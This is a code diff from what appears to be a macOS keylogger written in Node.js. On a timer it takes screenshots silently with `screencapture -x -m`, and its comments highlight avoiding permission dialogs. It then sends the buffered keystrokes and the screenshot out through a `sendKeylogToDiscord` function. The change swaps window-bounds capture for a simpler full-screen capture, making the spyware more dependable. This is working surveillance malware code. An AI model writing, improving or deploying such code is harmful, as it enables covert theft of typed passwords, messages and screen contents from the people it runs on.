@@ -884,50 +884,20 @@ setInterval(() => {
                 const timestamp = Date.now();
                 const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                 
-                // Get active window and capture it (shows the app/window, not desktop)
-                // Use a different approach - capture the window using AppleScript directly
-                exec(`osascript -e 'tell application "System Events" to tell (first process whose frontmost is true) to set windowBounds to bounds of window 1' 2>/dev/null`, (boundsError, bounds) => {
-                    if (!boundsError && bounds && bounds.trim()) {
-                        // Parse bounds and capture that region
-                        const boundsArray = bounds.trim().split(', ').map(Number);
-                        if (boundsArray.length === 4) {
-                            const width = boundsArray[2] - boundsArray[0];
-                            const height = boundsArray[3] - boundsArray[1];
-                            // Capture the window region
-                            exec(`screencapture -x -R ${boundsArray[0]},${boundsArray[1]},${width},${height} "${screenshotFile}"`, (screenshotError) => {
-                                if (!screenshotError && fs.existsSync(screenshotFile)) {
-                                    // Send with screenshot
-                                    sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
-                                } else {
-                                    // Send without screenshot if capture failed
-                                    sendKeylogToDiscord(keysBuffer, 'Unknown', null);
-                                }
-                                
-                                // Clear buffer after sending
-                                keysBuffer = '';
-                            });
-                        } else {
-                            // Fallback: capture main display
-                            exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
-                                if (!screenshotError && fs.existsSync(screenshotFile)) {
-                                    sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
-                                } else {
-                                    sendKeylogToDiscord(keysBuffer, 'Unknown', null);
-                                }
-                                keysBuffer = '';
-                            });
-                        }
+                // Capture screenshot silently (no permission dialogs)
+                // Use screencapture -x -m to capture main display (silent, no dialogs)
+                // This captures what's on screen, not just desktop background
+                exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
+                    if (!screenshotError && fs.existsSync(screenshotFile)) {
+                        // Send with screenshot
+                        sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
                     } else {
-                        // Fallback: capture main display
-                        exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
-                            if (!screenshotError && fs.existsSync(screenshotFile)) {
-                                sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
-                            } else {
-                                sendKeylogToDiscord(keysBuffer, 'Unknown', null);
-                            }
-                            keysBuffer = '';
-                        });
+                        // Send without screenshot if capture failed
+                        sendKeylogToDiscord(keysBuffer, 'Unknown', null);
                     }
+                    
+                    // Clear buffer after sending
+                    keysBuffer = '';
                 });
             }
         }
